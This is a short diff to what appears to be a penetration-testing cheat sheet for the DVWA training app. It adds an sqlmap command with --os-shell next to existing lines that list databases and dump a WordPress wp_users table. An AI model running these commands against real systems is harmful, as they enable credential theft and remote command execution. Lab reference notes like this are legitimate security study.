@@ -684,6 +684,7 @@ OTHERWISE:
 
 sqlmap -u http://xxxx/sql/?idxxxxxx=Submit#" --cookie="security=low; PHPSESSIONID=121121212" --dbs
 sqlmap -u http://xxxx/sql/?idxxxxxx=Submit#" --cookie="security=low; PHPSESSIONID=121121212" -D wordpress -T wp_users -dump
+sqlmap -u http://xxxx/sql/?idxxxxxx=Submit#" --cookie="security=low; PHPSESSIONID=121121212" --os-shell
 
 #Command Injection website input: box to enter ip to Ping a Device on DVWA
 
@@ -1636,6 +1637,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
